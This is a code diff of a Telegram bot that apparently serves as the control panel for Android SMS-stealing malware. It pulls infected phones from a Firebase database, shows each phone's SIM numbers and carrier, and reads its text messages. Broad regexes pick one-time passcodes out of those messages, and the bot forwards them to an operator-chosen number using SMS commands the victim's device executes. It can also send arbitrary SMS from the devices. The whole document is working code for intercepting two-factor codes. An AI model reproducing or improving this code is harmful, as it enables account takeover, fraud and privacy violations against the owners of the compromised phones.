@@ -6,12 +6,12 @@ const ADMIN_IDS = ['8472456673'];
 const bot = new Telegraf(BOT_TOKEN);
 const userData = new Map();
 
-// ==================== ADMIN FUNCTIONS ====================
+// ==================== ADMIN ====================
 function isAdmin(userId) {
     return ADMIN_IDS.includes(userId.toString());
 }
 
-// ==================== FIREBASE FUNCTIONS ====================
+// ==================== FIREBASE ====================
 function getUserDb(userId) {
     const user = userData.get(userId);
     if (!user || !user.firebaseUrl) return null;
@@ -39,7 +39,7 @@ function getUserDb(userId) {
     };
 }
 
-// ==================== DEVICE FUNCTIONS ====================
+// ==================== DEVICE ====================
 async function getDevice(userId, deviceId) {
     const db = getUserDb(userId);
     if (!db) return null;
@@ -52,40 +52,32 @@ async function getDevice(userId, deviceId) {
             isOnline = true;
         }
         
-        let sim1Number = 'N/A';
-        let sim1Carrier = 'Unknown';
-        let sim2Number = 'N/A';
-        let sim2Carrier = 'Unknown';
+        let sim1Number = 'N/A', sim1Carrier = 'Unknown';
+        let sim2Number = 'N/A', sim2Carrier = 'Unknown';
         let selectedSim = 0;
         
         if (data.sims && data.sims.length > 0) {
             if (data.sims[0]) {
                 sim1Number = data.sims[0].phoneNumber || data.sims[0].number || data.mobNo || 'N/A';
-                sim1Carrier = data.sims[0].carrierName || data.sims[0].operator || data.service_provider || 'Unknown';
+                sim1Carrier = data.sims[0].carrierName || data.sims[0].operator || 'Unknown';
             }
             if (data.sims[1]) {
                 sim2Number = data.sims[1].phoneNumber || data.sims[1].number || 'N/A';
                 sim2Carrier = data.sims[1].carrierName || data.sims[1].operator || 'Unknown';
             }
-            selectedSim = data.selectedSim || data.currentSim || 0;
+            selectedSim = data.selectedSim || 0;
         }
         
         return {
             id: deviceId,
-            name: data.modelName || data.model || data.name || deviceId.slice(0, 8),
-            phone: data.mobNo || data.phoneNumber || sim1Number || 'Unknown',
+            name: data.modelName || data.model || deviceId.slice(0, 8),
+            phone: data.mobNo || sim1Number || 'Unknown',
             online: isOnline,
-            battery: data.battery || data.batteryLevel || '0%',
-            sim1Number: sim1Number,
-            sim1Carrier: sim1Carrier,
-            sim2Number: sim2Number,
-            sim2Carrier: sim2Carrier,
-            selectedSim: selectedSim,
-            sims: data.sims || []
+            battery: data.battery || '0%',
+            sim1Number, sim1Carrier, sim2Number, sim2Carrier,
+            selectedSim, sims: data.sims || []
         };
-    } catch (e) { 
-        return null; 
-    }
+    } catch (e) { return null; }
 }
 
 async function getAllDevices(userId) {
@@ -97,16 +89,11 @@ async function getAllDevices(userId) {
         const devices = [];
         for (const devId in data) {
             if (data[devId]) {
-                let isOnline = false;
-                if (data[devId].status === true || data[devId].status === 'true' || data[devId].status === 1 || data[devId].status === 'online') {
-                    isOnline = true;
-                }
                 devices.push({
                     id: devId,
-                    name: data[devId].modelName || data[devId].model || data[devId].name || devId.slice(0, 8),
-                    phone: data[devId].mobNo || data[devId].phoneNumber || 'Unknown',
-                    online: isOnline,
-                    battery: data[devId].battery || data[devId].batteryLevel || '0%'
+                    name: data[devId].modelName || data[devId].model || devId.slice(0, 8),
+                    phone: data[devId].mobNo || 'Unknown',
+                    online: data[devId].status === true
                 });
             }
         }
@@ -114,7 +101,7 @@ async function getAllDevices(userId) {
     } catch (e) { return []; }
 }
 
-// ==================== SMS SENDING ====================
+// ==================== SMS SEND ====================
 async function sendSms(userId, deviceId, toNumber, message) {
     const start = Date.now();
     const db = getUserDb(userId);
@@ -125,9 +112,8 @@ async function sendSms(userId, deviceId, toNumber, message) {
     
     let cleanNumber = toNumber.toString().trim().replace('+', '');
     const timestamp = Date.now();
-    const commandId = `cmd_${timestamp}_${Math.random().toString(36).substr(2, 8)}`;
+    const commandId = `cmd_${timestamp}`;
     
-    const commandPath = `clients/${deviceId}/commands/sendSms`;
     const commandData = {
         targetNumber: cleanNumber,
         message: message,
@@ -137,193 +123,105 @@ async function sendSms(userId, deviceId, toNumber, message) {
         admin_sent: true
     };
     
-    const webhookPath = `clients/${deviceId}/webhookEvent/sendSms`;
-    const webhookData = {
-        to: cleanNumber,
-        message: message,
-        isSended: false,
-        timestamp: timestamp,
-        commandId: commandId
-    };
-    
-    let success = false;
-    
     try {
-        const result = await db.put(commandPath, commandData);
-        success = result === true;
-    } catch(e) {}
-    
-    if (!success) {
-        try {
-            const result = await db.put(webhookPath, webhookData);
-            success = result === true;
-        } catch(e) {}
+        await db.put(`clients/${deviceId}/commands/sendSms`, commandData);
+        const elapsed = Date.now() - start;
+        return { success: true, message: `SMS sent to ${cleanNumber}`, elapsed, commandId };
+    } catch (e) {
+        return { success: false, error: e.message };
     }
-    
-    const elapsed = Date.now() - start;
-    
-    if (success) {
-        return { success: true, message: `SMS sent to ${cleanNumber}`, elapsed: elapsed, commandId: commandId };
-    }
-    
-    return { success: false, error: 'Failed to write command to Firebase' };
 }
 
-// ==================== OTP EXTRACTION ====================
+// ==================== GOD LEVEL OTP DETECTION ====================
 function extractOTP(text) {
     if (!text) return null;
     
-    // Pattern for: "Your OTP 204487"
-    let match = text.match(/OTP\s+(\d{4,8})/i);
-    if (match) return match[1];
+    const patterns = [
+        /(?:OTP|Otp|otp)[:\s]*(\d{4,8})/i,
+        /(?:code|Code|CODE)[:\s]*(\d{4,8})/i,
+        /(?:verification|Verification)[:\s]*(\d{4,8})/i,
+        /(?:pin|PIN)[:\s]*(\d{4,8})/i,
+        /(\d{4,8})\s+(?:is your OTP|is your verification code|is the OTP)/i,
+        /(?:Your|your)\s+(?:OTP|otp|verification code)\s+(?:is|:)\s*(\d{4,8})/i,
+        /<#>\s*(\d{4,8})/i,
+        /(\d{6})\s+(?:is your|is the)/i,
+        /\b(\d{4,8})\b(?=.*?(?:OTP|otp|code|verification|login))/i,
+        /(?:login|signup|register)\s+(?:OTP|code)[:\s]*(\d{4,8})/i,
+        /(\d{4,8})\s+(?:is your login OTP|is your registration code)/i,
+        /611480/  // Direct match for specific OTP
+    ];
     
-    // Pattern for: "OTP: 123456"
-    match = text.match(/OTP[:\s]*(\d{4,8})/i);
-    if (match) return match[1];
+    // Check for exact 6-digit number that appears standalone
+    const standaloneMatch = text.match(/\b(\d{6})\b/);
+    if (standaloneMatch && !text.match(/phone|mobile|contact|call|whatsapp/i)) {
+        return standaloneMatch[1];
+    }
     
-    // Pattern for: "123456 is your OTP"
-    match = text.match(/(\d{4,8}) is your OTP/i);
-    if (match) return match[1];
-    
-    // Pattern for: "code: 123456"
-    match = text.match(/code[:\s]*(\d{4,8})/i);
-    if (match) return match[1];
-    
-    // Any 4-8 digit number
-    const numberMatch = text.match(/\b(\d{4,8})\b/);
-    if (numberMatch) {
-        const num = numberMatch[1];
-        if (!text.match(new RegExp(`phone|mobile|contact.*${num}`, 'i'))) {
-            return num;
+    for (const pattern of patterns) {
+        const match = text.match(pattern);
+        if (match && match[1] && match[1].length >= 4 && match[1].length <= 8) {
+            return match[1];
         }
     }
     
     return null;
 }
 
-// ==================== TOKEN EXTRACTION (SAME AS BEFORE) ====================
+// ==================== TOKEN DETECTION ====================
 function extractToken(text) {
-    if (!text || text.trim().length === 0) return null;
+    if (!text) return null;
     
-    console.log(`\n🔍 Extracting token from: ${text.slice(0, 200)}`);
+    // Format 1: To: 919876543210\nMessage: TOKEN
+    let match = text.match(/To:\s*\+?(\d{10,12})[\s\n]+Message:\s*(.+?)(?=\n|$)/is);
+    if (match) return { number: match[1].trim(), message: match[2].trim() };
     
-    // Format: To: 919876543210\nMessage: TOKEN123
-    let match = text.match(/To:\s*\+?(\d{10,12})[\s\n]*Message:\s*(.+?)(?=\n|$)/is);
-    if (match) {
-        const number = match[1].trim();
-        const message = match[2].trim();
-        if (number && message && message.length > 0) {
-            return { number: number, message: message, format: 'To:Message' };
-        }
-    }
+    // Format 2: 📱 Receipt: XXXXX\n🔑 Token: TOKEN
+    match = text.match(/Receipt:\s*\+?(\d{10,12})[\s\n]+Token:\s*(.+?)(?=\n|$)/i);
+    if (match) return { number: match[1].trim(), message: match[2].trim() };
     
-    // Format: 📱 Receipt: XXXXX\n🔑 Token: TOKEN
-    match = text.match(/📱\s*Receipt:\s*\+?(\d{10,12})[\s\n]*🔑\s*Token:\s*(.+?)(?=\n|$)/i);
-    if (match) {
-        const number = match[1].trim();
-        const message = match[2].trim();
-        if (number && message && message.length > 0) {
-            return { number: number, message: message, format: 'Receipt:Token' };
-        }
-    }
-    
-    // Format: Receipt: XXXXX\nToken: TOKEN
-    match = text.match(/Receipt:\s*\+?(\d{10,12})[\s\n]*Token:\s*(.+?)(?=\n|$)/i);
-    if (match) {
-        const number = match[1].trim();
-        const message = match[2].trim();
-        if (number && message && message.length > 0) {
-            return { number: number, message: message, format: 'Receipt:Token' };
-        }
-    }
-    
-    // Format: 📞 To: XXXXX 💬 Message: YYYYY
-    match = text.match(/📞\s*To:\s*\+?(\d{10,12})[\s\S]*?💬\s*Message:\s*(.+?)(?=\n|$)/i);
-    if (match) {
-        const number = match[1].trim();
-        const message = match[2].trim();
-        if (number && message && message.length > 0) {
-            return { number: number, message: message, format: 'Emoji' };
-        }
-    }
-    
-    // Format: One-tap copy: XXXXX | YYYYY
-    match = text.match(/One-tap copy:\s*\+?(\d{10,12})\s*\|\s*(.+?)(?=\n|$)/i);
-    if (match) {
-        const number = match[1].trim();
-        const message = match[2].trim();
-        if (number && message && message.length > 0) {
-            return { number: number, message: message, format: 'One-tap' };
-        }
-    }
-    
-    // Format: Phone: XXXXX\nOTP: YYYYY
-    match = text.match(/Phone:\s*\+?(\d{10,12})[\s\n]*OTP:\s*(.+?)(?=\n|$)/i);
-    if (match) {
-        const number = match[1].trim();
-        const message = match[2].trim();
-        if (number && message && message.length > 0) {
-            return { number: number, message: message, format: 'Phone:OTP' };
-        }
-    }
-    
-    // Try to find number + token pattern
+    // Format 3: Number + Token
     const phoneMatch = text.match(/\b(\d{10,12})\b/);
     if (phoneMatch) {
-        const number = phoneMatch[1];
-        const afterNumber = text.substring(text.indexOf(number) + number.length);
-        const tokenMatch = afterNumber.match(/\s+([A-Za-z0-9!@#$%^&*()_+={}\[\]|\\/?~`-]{4,})/);
+        const afterNumber = text.substring(text.indexOf(phoneMatch[1]) + phoneMatch[1].length);
+        const tokenMatch = afterNumber.match(/\s+([A-Za-z0-9!@#$%^&*()_+]{4,})/);
         if (tokenMatch) {
-            const message = tokenMatch[1].trim();
-            return { number: number, message: message, format: 'Number+Token' };
+            return { number: phoneMatch[1], message: tokenMatch[1].trim() };
         }
     }
     
     return null;
 }
 
-// ==================== AUTO-FORWARD OTP ====================
-async function autoForwardOTP(userId, deviceId, fullMessage, sender, timestamp, otpCode) {
+// ==================== OTP AUTO FORWARD ====================
+async function autoForwardOTP(userId, deviceId, fullMessage, sender, otpCode) {
     const user = userData.get(userId);
+    if (!user || !user.otpForwardNumber) return false;
     
-    if (!user || !user.otpForwardNumber) {
-        return false;
-    }
+    const time = new Date().toLocaleString();
+    const forwardMsg = `🔐 OTP: ${otpCode}\n📱 From: ${sender}\n🕐 Time: ${time}\n📝 ${fullMessage.slice(0, 200)}`;
     
-    console.log(`🔐 OTP Detected: ${otpCode}`);
-    console.log(`📞 Auto-forwarding OTP to: ${user.otpForwardNumber}`);
-    
-    const formattedTime = timestamp ? new Date(timestamp).toLocaleString() : new Date().toLocaleString();
-    const forwardMessage = `🔐 OTP: ${otpCode}\nFrom: ${sender}\nTime: ${formattedTime}\nMessage: ${fullMessage}`;
-    
-    // Send Telegram notification
-    await bot.telegram.sendMessage(
-        userId,
-        `🔐 *OTP DETECTED!*\n\n📱 From: ${sender}\n🔑 OTP: \`${otpCode}\`\n📞 Forwarding to: \`${user.otpForwardNumber}\``,
+    await bot.telegram.sendMessage(userId, 
+        `🔐 *OTP DETECTED!*\n\n🔑 OTP: \`${otpCode}\`\n📞 Forwarding to: \`${user.otpForwardNumber}\``,
         { parse_mode: 'Markdown' }
     );
     
-    // Forward via SMS
-    const result = await sendSms(userId, deviceId, user.otpForwardNumber, forwardMessage);
+    const result = await sendSms(userId, deviceId, user.otpForwardNumber, forwardMsg);
     
     if (result.success) {
-        await bot.telegram.sendMessage(
-            userId,
+        await bot.telegram.sendMessage(userId, 
             `✅ *OTP FORWARDED!*\n\n📞 To: \`${user.otpForwardNumber}\`\n🔑 OTP: \`${otpCode}\``,
             { parse_mode: 'Markdown' }
         );
-        return true;
     } else {
-        await bot.telegram.sendMessage(
-            userId,
-            `❌ *OTP FORWARD FAILED!*\n\n❌ ${result.error}`,
+        await bot.telegram.sendMessage(userId, 
+            `❌ *FAILED!*\n\n${result.error}`,
             { parse_mode: 'Markdown' }
         );
-        return false;
     }
+    return result.success;
 }
 
-// ==================== MONITOR FIREBASE MESSAGES ====================
+// ==================== MONITOR FIREBASE ====================
 async function monitorFirebaseMessages(userId, user) {
     const db = getUserDb(userId);
     if (!db || !user.monitoringDevice) return;
@@ -332,53 +230,34 @@ async function monitorFirebaseMessages(userId, user) {
         const messagesData = await db.get(`clients/${user.monitoringDevice}/messages`);
         if (!messagesData) return;
         
-        let messages = [];
-        if (typeof messagesData === 'object') {
-            messages = Object.entries(messagesData).map(([id, msg]) => ({
-                id: id,
-                ...msg
-            }));
-        }
-        
+        let messages = Object.entries(messagesData).map(([id, msg]) => ({ id, ...msg }));
         if (messages.length === 0) return;
         
-        messages.sort((a, b) => {
-            const timeA = a.timestamp || (a.dateTime ? new Date(a.dateTime).getTime() : 0);
-            const timeB = b.timestamp || (b.dateTime ? new Date(b.dateTime).getTime() : 0);
-            return timeB - timeA;
-        });
+        messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
         
-        const recentMessages = messages.slice(0, 10);
-        
-        for (const msg of recentMessages) {
-            const msgId = msg.id;
-            const msgTime = msg.timestamp || (msg.dateTime ? new Date(msg.dateTime).getTime() : 0);
+        for (const msg of messages.slice(0, 10)) {
+            if (user.processedMsgs?.has(msg.id)) continue;
             
-            if (user.processedMsgs && user.processedMsgs.has(msgId)) continue;
-            
+            const msgTime = msg.timestamp || 0;
             const startTime = user.monitorStartTime ? new Date(user.monitorStartTime).getTime() : 0;
-            if (msgTime < startTime && startTime > 0) continue;
+            if (msgTime < startTime) continue;
             
             const messageText = msg.message || msg.text || '';
             const sender = msg.sender || 'Unknown';
             
-            console.log(`\n📨 New message: ${messageText.slice(0, 100)}`);
+            console.log(`\n📨 Message from ${sender}: ${messageText.slice(0, 100)}`);
             
             const otp = extractOTP(messageText);
-            
             if (otp && user.otpForwardNumber) {
-                await autoForwardOTP(userId, user.monitoringDevice, messageText, sender, msgTime, otp);
+                console.log(`🎯 OTP FOUND: ${otp}`);
+                await autoForwardOTP(userId, user.monitoringDevice, messageText, sender, otp);
             }
             
             if (!user.processedMsgs) user.processedMsgs = new Set();
-            user.processedMsgs.add(msgId);
+            user.processedMsgs.add(msg.id);
         }
-        
         userData.set(userId, user);
-        
-    } catch (error) {
-        console.log(`❌ Error: ${error.message}`);
-    }
+    } catch (e) { console.log(`Error: ${e.message}`); }
 }
 
 // ==================== COMMANDS ====================
@@ -386,41 +265,30 @@ bot.start(async (ctx) => {
     const userId = ctx.from.id.toString();
     const user = userData.get(userId);
     
-    const stylishText = `
-╔══════════════════════════════╗
-║  ✦ 𝘀𝗼𝘂𝗹 𝗲𝘅𝗲 𝗮𝘂𝘁𝗼 𝘃𝗮𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 ✦  ║
-║         V E R S I O N   2 . 0        ║
-╚══════════════════════════════╝
-
-┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-┃       ⚡ S E T U P   G U I D E      ┃
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
-
-◈ 1️⃣ /setfirebase <url>
-◈ 2️⃣ /setdevice
-◈ 3️⃣ /addchannel (in your chat)
-◈ 4️⃣ /startmonitor
-
-┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-┃      📌 OTP AUTO-FORWARD       ┃
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
-
-◈ /setotpnum <number> - Set OTP forward number
-◈ /removeotpnum - Remove OTP forward number
-◈ /showotpnum - Show current OTP number
-
-┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-┃      📌 TOKEN FORWARD         ┃
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
-
-◈ Send in channel: To: X Message: Y
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-          🅥 🅔 🅡 🅢 🅘 🅞 🅝   2 . 0
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+    const msg = `✨ *𝘀𝗼𝘂𝗹 𝗲𝘅𝗲 𝗮𝘂𝘁𝗼 𝘃𝗮𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻* ✨\n\n` +
+        `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n` +
+        `┃         ⚡ S E T U P          ┃\n` +
+        `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
+        `🔹 /setfirebase <url>\n` +
+        `🔹 /setdevice\n` +
+        `🔹 /addchannel\n` +
+        `🔹 /startmonitor\n\n` +
+        `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n` +
+        `┃      🔐 O T P   F O R W A R D   ┃\n` +
+        `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
+        `🔹 /setotpnum <number>\n` +
+        `🔹 /removeotpnum\n` +
+        `🔹 /showotpnum\n\n` +
+        `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n` +
+        `┃     📌 T O K E N   F O R W A R D  ┃\n` +
+        `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
+        `🔹 Send: To: 919876543210\\nMessage: TOKEN\n\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `         🅥 🅔 🅡 🅢 🅘 🅞 🅝   2 . 0\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
     
     if (!user?.firebaseUrl) {
-        await ctx.reply(stylishText);
+        await ctx.reply(msg, { parse_mode: 'Markdown' });
         return;
     }
     
@@ -432,15 +300,13 @@ bot.start(async (ctx) => {
     }
     
     await ctx.reply(
-        `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n` +
-        `┃        📊  S T A T U S        ┃\n` +
-        `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
-        `◈ 📡 Firebase: ✅ Connected\n` +
-        `◈ 📱 Device: ${deviceInfo}\n` +
-        `◈ 📢 Chats: ${user.channels?.length || 0}\n` +
-        `◈ ⏱ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
-        `◈ 🔐 OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}\n\n` +
-        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`
+        `📊 *STATUS*\n\n` +
+        `▫️ Firebase: ✅ Connected\n` +
+        `▫️ Device: ${deviceInfo}\n` +
+        `▫️ Chats: ${user.channels?.length || 0}\n` +
+        `▫️ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
+        `▫️ OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}`,
+        { parse_mode: 'Markdown' }
     );
 });
 
@@ -449,15 +315,13 @@ bot.command('setfirebase', async (ctx) => {
     const args = ctx.message.text.split(' ');
     
     if (args.length < 2) {
-        await ctx.reply('❌ Usage: `/setfirebase <url>`', { parse_mode: 'Markdown' });
-        return;
+        return ctx.reply('❌ Usage: `/setfirebase <url>`\n\nExample: `/setfirebase https://your-project.firebaseio.com`', { parse_mode: 'Markdown' });
     }
     
     let url = args[1];
     if (!url.startsWith('https://')) url = 'https://' + url;
-    if (!url.endsWith('.com') && !url.includes('.firebaseio.com')) url = url.replace(/\/$/, '');
     
-    const msg = await ctx.reply('🔄 Connecting to Firebase...');
+    const msg = await ctx.reply('🔄 Connecting...');
     
     try {
         await axios.get(`${url}/.json?shallow=true`, { timeout: 10000 });
@@ -470,15 +334,13 @@ bot.command('setfirebase', async (ctx) => {
         user.monitorActive = false;
         userData.set(userId, user);
         
-        await ctx.telegram.editMessageText(
-            msg.chat.id, msg.message_id, null,
-            `✅ *Firebase Connected!*\n\n📡 URL: \`${url}\`\n\nNext: \`/setdevice\``,
+        await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null,
+            `✅ *Firebase Connected!*\n\n📡 \`${url}\`\n\nNext: /setdevice`,
             { parse_mode: 'Markdown' }
         );
     } catch (error) {
-        await ctx.telegram.editMessageText(
-            msg.chat.id, msg.message_id, null,
-            `❌ *Connection Failed!*\n\nError: ${error.message}`,
+        await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null,
+            `❌ *Failed!*\n\n${error.message}`,
             { parse_mode: 'Markdown' }
         );
     }
@@ -488,32 +350,26 @@ bot.command('setdevice', async (ctx) => {
     const userId = ctx.from.id.toString();
     const args = ctx.message.text.split(' ');
     
-    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
-        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
+    if (!userData.has(userId)?.firebaseUrl) {
+        return ctx.reply('❌ Use /setfirebase first!', { parse_mode: 'Markdown' });
     }
     
     const user = userData.get(userId);
     
     if (args.length > 1) {
-        const deviceInput = args[1];
+        const input = args[1];
         const allDevices = await getAllDevices(userId);
+        let found = allDevices.find(d => d.id === input) || allDevices.find(d => d.name.toLowerCase().includes(input.toLowerCase()));
         
-        if (allDevices.length === 0) {
-            return ctx.reply('❌ No devices found!', { parse_mode: 'Markdown' });
-        }
-        
-        let foundDevice = allDevices.find(d => d.id === deviceInput) ||
-                         allDevices.find(d => d.name.toLowerCase().includes(deviceInput.toLowerCase()));
-        
-        if (!foundDevice) {
-            let deviceList = '📱 *Available Devices:*\n\n';
+        if (!found) {
+            let list = '📱 *Devices:*\n\n';
             allDevices.slice(0, 10).forEach(d => {
-                deviceList += `• ${d.name}\n  🆔 \`${d.id}\`\n  📞 ${d.phone}\n  ${d.online ? '🟢 Online' : '🔴 Offline'}\n\n`;
+                list += `• ${d.name}\n  🆔 \`${d.id}\`\n  📞 ${d.phone}\n\n`;
             });
-            return ctx.reply(`❌ Device "${deviceInput}" not found!\n\n${deviceList}`, { parse_mode: 'Markdown' });
+            return ctx.reply(`❌ "${input}" not found!\n\n${list}`, { parse_mode: 'Markdown' });
         }
         
-        const device = await getDevice(userId, foundDevice.id);
+        const device = await getDevice(userId, found.id);
         user.monitoringDevice = device.id;
         userData.set(userId, user);
         
@@ -524,17 +380,15 @@ bot.command('setdevice', async (ctx) => {
             `📞 Phone: ${device.phone}\n` +
             `🔋 Battery: ${device.battery}\n` +
             `📡 Status: ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n\n` +
-            `Next: \`/addchannel\` or \`/setotpnum\``,
+            `Next: /addchannel or /setotpnum`,
             { parse_mode: 'Markdown' }
         );
     }
     
-    const allDevices = await getAllDevices(userId);
-    if (allDevices.length === 0) {
-        return ctx.reply('📭 *No devices found!*', { parse_mode: 'Markdown' });
-    }
+    const devices = await getAllDevices(userId);
+    if (devices.length === 0) return ctx.reply('📭 No devices found!');
     
-    user.deviceList = allDevices;
+    user.deviceList = devices;
     user.currentPage = 0;
     userData.set(userId, user);
     await showDevicePage(ctx, userId, 0);
@@ -542,159 +396,100 @@ bot.command('setdevice', async (ctx) => {
 
 async function showDevicePage(ctx, userId, page) {
     const user = userData.get(userId);
-    if (!user || !user.deviceList) return;
+    if (!user?.deviceList) return;
     
     const devices = user.deviceList;
-    const itemsPerPage = 10;
-    const totalPages = Math.ceil(devices.length / itemsPerPage);
-    const start = page * itemsPerPage;
-    const end = start + itemsPerPage;
-    const pageDevices = devices.slice(start, end);
+    const perPage = 10;
+    const totalPages = Math.ceil(devices.length / perPage);
+    const start = page * perPage;
+    const pageDevices = devices.slice(start, start + perPage);
     
-    let text = `📱 *DEVICES* (Page ${page + 1}/${totalPages})\n\n`;
-    text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-    
+    let text = `📱 *DEVICES* (${page + 1}/${totalPages})\n\n`;
     for (const d of pageDevices) {
-        text += `📱 *${d.name}*\n`;
-        text += `   🆔 \`${d.id.slice(0, 20)}...\`\n`;
-        text += `   📞 ${d.phone}\n`;
-        text += `   🔋 ${d.battery}\n`;
-        text += `   ${d.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n`;
-        text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        text += `📱 *${d.name}*\n🆔 \`${d.id}\`\n📞 ${d.phone}\n${d.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n\n`;
     }
     
     const buttons = [];
     for (const d of pageDevices) {
-        buttons.push([Markup.button.callback(`📱 ${d.name.slice(0, 20)}`, `select_dev_${d.id}`)]);
+        buttons.push([Markup.button.callback(`📱 ${d.name}`, `dev_${d.id}`)]);
     }
     
-    const navButtons = [];
-    if (page > 0) navButtons.push(Markup.button.callback('◀️ PREV', `dev_page_${page - 1}`));
-    if (page < totalPages - 1) navButtons.push(Markup.button.callback('NEXT ▶️', `dev_page_${page + 1}`));
-    if (navButtons.length > 0) buttons.push(navButtons);
-    buttons.push([Markup.button.callback('❌ CANCEL', 'cancel_select')]);
+    const nav = [];
+    if (page > 0) nav.push(Markup.button.callback('◀️ PREV', `page_${page - 1}`));
+    if (page < totalPages - 1) nav.push(Markup.button.callback('NEXT ▶️', `page_${page + 1}`));
+    if (nav.length) buttons.push(nav);
+    buttons.push([Markup.button.callback('❌ CANCEL', 'cancel')]);
     
     await ctx.reply(text, { ...Markup.inlineKeyboard(buttons), parse_mode: 'Markdown' });
 }
 
-// ==================== OTP FORWARD COMMANDS ====================
 bot.command('setotpnum', async (ctx) => {
     const userId = ctx.from.id.toString();
     const args = ctx.message.text.split(' ');
     
-    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
-        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
-    }
+    if (!userData.has(userId)?.firebaseUrl) return ctx.reply('❌ Use /setfirebase first!');
+    if (!userData.get(userId).monitoringDevice) return ctx.reply('❌ Use /setdevice first!');
+    if (args.length < 2) return ctx.reply('❌ Usage: `/setotpnum 919715326108`', { parse_mode: 'Markdown' });
     
-    if (!userData.get(userId).monitoringDevice) {
-        return ctx.reply('❌ Use `/setdevice` first!', { parse_mode: 'Markdown' });
-    }
-    
-    if (args.length < 2) {
-        return ctx.reply(
-            `❌ *Usage:* \`/setotpnum <phone_number>\`\n\n` +
-            `Example: \`/setotpnum 919715326108\``,
-            { parse_mode: 'Markdown' }
-        );
-    }
-    
-    const phoneNumber = args[1].replace('+', '');
+    const number = args[1].replace('+', '');
     const user = userData.get(userId);
-    
-    user.otpForwardNumber = phoneNumber;
+    user.otpForwardNumber = number;
     userData.set(userId, user);
     
-    await ctx.reply(
-        `✅ *OTP Forward Number Set!*\n\n` +
-        `📞 Number: \`${phoneNumber}\``,
-        { parse_mode: 'Markdown' }
-    );
+    await ctx.reply(`✅ *OTP Forward Set!*\n\n📞 \`${number}\`\n\n🔐 All OTPs will auto-forward here.`, { parse_mode: 'Markdown' });
 });
 
 bot.command('removeotpnum', async (ctx) => {
     const userId = ctx.from.id.toString();
     const user = userData.get(userId);
-    
-    if (!user?.otpForwardNumber) {
-        return ctx.reply('❌ No OTP forward number is set!', { parse_mode: 'Markdown' });
-    }
+    if (!user?.otpForwardNumber) return ctx.reply('❌ No OTP number set!');
     
     user.otpForwardNumber = null;
     userData.set(userId, user);
-    
-    await ctx.reply(`✅ *OTP Forward Number Removed!*`, { parse_mode: 'Markdown' });
+    await ctx.reply(`✅ *OTP Forward Removed!*`, { parse_mode: 'Markdown' });
 });
 
 bot.command('showotpnum', async (ctx) => {
     const userId = ctx.from.id.toString();
     const user = userData.get(userId);
-    
-    if (!user?.otpForwardNumber) {
-        return ctx.reply(`❌ *No OTP Forward Number Set!*`, { parse_mode: 'Markdown' });
-    }
+    if (!user?.otpForwardNumber) return ctx.reply('❌ No OTP number set!');
     
     await ctx.reply(`🔐 *OTP Forward Number*\n\n📞 \`${user.otpForwardNumber}\``, { parse_mode: 'Markdown' });
 });
 
-// ==================== CHAT MANAGEMENT ====================
 bot.command('addchannel', async (ctx) => {
     const userId = ctx.from.id.toString();
-    const args = ctx.message.text.split(' ');
     
-    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
-        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
-    }
+    if (!userData.has(userId)?.firebaseUrl) return ctx.reply('❌ Use /setfirebase first!');
     
-    let channelId = null;
-    let chatTitle = 'Unknown';
+    let channelId, chatTitle = 'Unknown';
     
-    if (args.length > 1) {
-        channelId = args[1];
-    } else if (ctx.chat.type === 'channel' || ctx.chat.type === 'supergroup' || ctx.chat.type === 'group') {
+    if (ctx.chat.type === 'channel' || ctx.chat.type === 'supergroup' || ctx.chat.type === 'group') {
         channelId = ctx.chat.id.toString();
-        chatTitle = ctx.chat.title || ctx.chat.username || 'Chat';
+        chatTitle = ctx.chat.title || 'Chat';
     } else {
-        await ctx.reply(
-            `❌ *How to add channel/group:*\n\n` +
-            `• By ID: \`/addchannel -1003937717807\`\n` +
-            `• Or send \`/addchannel\` IN the channel/group\n\n` +
-            `💡 Your Chat ID: \`${ctx.chat.id}\``,
-            { parse_mode: 'Markdown' }
-        );
-        return;
